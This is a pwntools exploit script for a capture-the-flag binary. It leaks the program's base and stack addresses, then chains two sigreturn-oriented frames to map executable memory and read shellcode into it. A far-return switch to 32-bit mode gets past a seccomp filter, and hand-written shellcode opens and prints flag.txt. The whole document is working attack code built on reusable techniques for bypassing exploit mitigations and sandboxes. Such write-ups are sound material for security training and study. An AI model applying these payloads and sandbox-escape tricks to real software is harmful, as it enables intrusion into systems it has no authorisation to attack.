from pwn import *

exe = ELF(b'./chall')
context.arch = 'amd64'

def conn():
    r = process([exe.path])
    gdb.attach(r, gdbscript='b main')
    return r

def leaking(r, payload):
    r.recvuntil(b'>> ')
    r.sendline(payload)
    r.recvuntil(b'\n')
    return r.recvuntil(b'Who')[:-4]

def send(r, payload):
    r.recvuntil(b'>> ')
    r.sendline(payload)
    return


def main():
    to_overflow = b'Baaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa'.split(b'ajaa')[0]
    r = conn()

    # leaking the pie :
    payload = b'A' * (8 * 8 - 1) # writing A's up to the return address 
    leak = leaking(r, payload)
    leak_pie = int.from_bytes(leak[8:16], 'little')
    rbp_leak = int.from_bytes(leak[:8], 'little')
    print(f"rbp @ {hex(rbp_leak)}")
    exe.address = leak_pie - (exe.symbols['main'] + 357)

    print(f"leaking pie @ {hex(exe.address)}")

    # SROP 
    loop_back = exe.symbols['upside_down_world_enter'] + (0x12d8 - 0x12d0)
    pop_rbp = exe.address + 0x1133
    fake_rbp_intelligent = rbp_leak + 0x40 - 0xb0 # calculated from trying this with gdb and having an approximate idea of where it should be from rev of the code

    syscall_gadget = exe.address + 0x0000000000001327
    retf_gadget = exe.address + 0x0000000000001223
    mmap_address = 0x602000

    frame1 = SigreturnFrame()
    frame1.rax = 9
    frame1.rdi = mmap_address
    frame1.rsi = 0x1000
    frame1.rdx = 7 
    frame1.r10 = 0x32 
    frame1.r8 = 0xffffffff
    frame1.r9 = 0
    frame1.rbp = fake_rbp_intelligent + len(bytes(SigreturnFrame()))
    frame1.rsp = frame1.rbp + 8 
    frame1.rip = exe.address + 0x00000000000012f1 # first syscall mmap an area at 0x602000 of len 0x1000 bytes. We go back to the beginning of vuln function to resetup the environment for another srop

    payload = b'B' * len(to_overflow)
    payload += p64(pop_rbp) + p64(fake_rbp_intelligent) + p64(loop_back) # finding a way to have a first sigreturn frame executed 
    payload += b'BBBBBBBB' # FAKE RBP
    payload += p64(syscall_gadget)
    payload += bytes(frame1)

    send(r, payload)

    frame2 = SigreturnFrame()
    frame2.rax = 0 
    frame2.rdi = 0 
    frame2.rsi = mmap_address + 0x190
    frame2.rdx = 100
    frame2.rbp = frame1.rbp + 8 + len(bytes(SigreturnFrame())) + 0x20 - 0x8 * 1
    frame2.rsp = frame2.rbp + 0x18 - 0x20 - 8
    frame2.rip = frame1.rip # second syscall read to place shellcode somewhere on mmap. 

    new_fake_rbp_intelligent = frame1.rsp + 16

    payload = b'B' * len(to_overflow)
    payload += p64(pop_rbp) + p64(new_fake_rbp_intelligent) + p64(loop_back) # finding a way to have a first sigreturn frame executed 
    payload += p64(syscall_gadget)
    payload += bytes(frame2)
    payload += p64(retf_gadget)
    payload += p32(mmap_address + 0x190) # passing from x64 to x86 to execute our shellcode in the mmap without having to care about the seccomp policy
    payload += p32(0x23)
    payload += b'\x00' * (0x664 - len(payload) - 2)

    send(r, payload)

    shellcodes = b'\xbc\x50\x20\x60\x00\x31\xc0\xb9\x00\x00\x00\x00\xba\x09\x03\x00\x00\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x8d\x1c\x24\x52\x51\x53\xb0\x05\xcd\x80\x89\xc7' # x86 shellcode
    shellcodes += b'\x6a\x33' # push 0x33 
    shellcodes += b'\x68' + p32(mmap_address + 0x190 + 39 + 8) # push rip value we want
    shellcodes += b'\xcb' # retf instruction
    shellcodes += b'\x48\x31\xc0\xb0\x00\xbe\x90\x21\x60\x00\xba\x20\x01\x00\x00\x0f\x05\x48\x31\xc0\xb0\x01\xbf\x01\x00\x00\x00\xbe\x90\x21\x60\x00\x0f\x05\xb0\x3c\xbf\x00\x00\x00\x00\x0f\x05' # x64 shellcode knowing we have a fd for flag.txt @ 602080
    r.sendline(shellcodes)
    # I will read flag.txt because poping a shell would be useless here (check reversing part), therefore you can `touch flag.txt` before trying the script

    r.interactive()

if __name__ == '__main__':
    main()
